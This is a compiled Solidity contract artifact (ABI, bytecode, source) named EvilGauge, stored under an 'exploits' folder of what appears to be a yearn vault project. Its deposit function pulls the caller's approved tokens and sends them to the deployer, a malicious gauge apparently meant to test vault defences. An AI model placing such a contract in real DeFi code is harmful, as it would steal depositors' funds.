{
    "contractName": "EvilGauge",
    "abi": [
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "_token",
                    "type": "address"
                }
            ],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "deposit",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ],
    "bytecode": "0x608060405234801561001057600080fd5b5060405161017e38038061017e8339818101604052602081101561003357600080fd5b5051600180546001600160a01b03199081163317909155600080546001600160a01b039093169290911691909117905561010c806100726000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063b6b55f2514602d575b600080fd5b604760048036036020811015604157600080fd5b50356049565b005b60008054600154604080516323b872dd60e01b81523360048201526001600160a01b03928316602482015260448101869052905191909216926323b872dd92606480820193602093909283900390910190829087803b15801560aa57600080fd5b505af115801560bd573d6000803e3d6000fd5b505050506040513d602081101560d257600080fd5b50505056fea265627a7a72315820916e7d127f68a55c898114094f3b58167c4f7dae0f48180ef8b017a43d630ad864736f6c63430005110032",
    "source": "pragma solidity =0.5.17;\n\nimport \"@openzeppelinV2/contracts/token/ERC20/IERC20.sol\";\n\ncontract EvilGauge {\n    IERC20 token;\n    address owner;\n\n    constructor(address _token) public {\n        owner = msg.sender;\n        token = IERC20(_token);\n    }\n\n    function deposit(uint256 amount) public {\n        token.transferFrom(msg.sender, owner, amount);\n    }\n}\n",
    "sourcePath": "/Users/sbacha/V2yearn/contracts/exploits/EvilGauge.sol",
    "compiler": {
        "name": "solc",
        "version": "0.5.17+commit.d19bba13.Emscripten.clang"
    },
    "schemaVersion": "3.1.0",
    "updatedAt": "2020-11-01T01:33:12.744Z",
    "devdoc": {
        "methods": {}
    },
    "userdoc": {
        "methods": {}
    }
}